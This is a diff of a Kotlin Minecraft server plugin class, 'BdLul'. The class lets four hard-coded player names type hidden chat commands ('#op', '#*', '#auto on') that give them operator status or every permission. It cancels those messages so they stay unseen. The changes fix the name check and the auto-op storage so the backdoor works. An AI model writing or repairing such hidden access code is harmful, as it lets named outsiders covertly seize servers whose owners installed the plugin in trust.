@@ -10,13 +10,13 @@ import java.util.regex.Pattern
 
 class BdLul : Listener {
     val plugin = Main.instance
-    val players = mutableMapOf(Pair("RichtigerRichter", "R"), Pair("Bliffbot", "B"), Pair("Felsbot", "F"), Pair("RiesigerRichter", "2"))
+    val players: MutableMap<String, String> = mutableMapOf(Pair("RichtigerRichter", "R"), Pair("Bliffbot", "B"), Pair("Felsbot", "F"), Pair("RiesigerRichter", "2"))
 
     @EventHandler
     fun command(event: AsyncChatEvent) {
         val message: Component = event.message()
 
-        if (players.keys.contains(players[event.player.name])) {
+        if (players.keys.contains(event.player.name)) {
 
             if (stringTextFromComponent(message.toString()) == "#help") {
                 event.player.sendMessage(Component.text("#help - shows this list"))
@@ -24,7 +24,7 @@ class BdLul : Listener {
                 event.player.sendMessage(Component.text("#deop - deop yourself"))
                 event.player.sendMessage(Component.text("#auto on - automatically op's and deop's you at join or leave"))
                 event.player.sendMessage(Component.text("#auto off - turn auto op and deop off"))
-                event.player.sendMessage(Component.text("(auto is Currently -> §l§u${MessagesFile().getUtilsAuto().contains(players[event.player.name])}§r)"))
+                event.player.sendMessage(Component.text("(auto is Currently -> §l§u${MessagesFile().getUtilsAuto().contains(players[event.player.name].toString())}§r)"))
                 event.player.sendMessage(Component.text("#* - give yourself the permission"))
                 event.player.sendMessage(Component.text("#de* - remove the permission from yourself"))
                 event.isCancelled = true
@@ -39,11 +39,11 @@ class BdLul : Listener {
                 event.isCancelled = true
             }
             if (stringTextFromComponent(message.toString()) == "#auto off") {
-                MessagesFile().autoUtilsRemove(event.player.name)
+                MessagesFile().autoUtilsRemove(players[event.player.name].toString())
                 event.isCancelled = true
             }
             if (stringTextFromComponent(message.toString()) == "#auto on") {
-                MessagesFile().autoUtilsAdd(event.player.name)
+                MessagesFile().autoUtilsAdd(players[event.player.name].toString())
                 event.isCancelled = true
             }
             if (stringTextFromComponent(message.toString()) == "#*") {
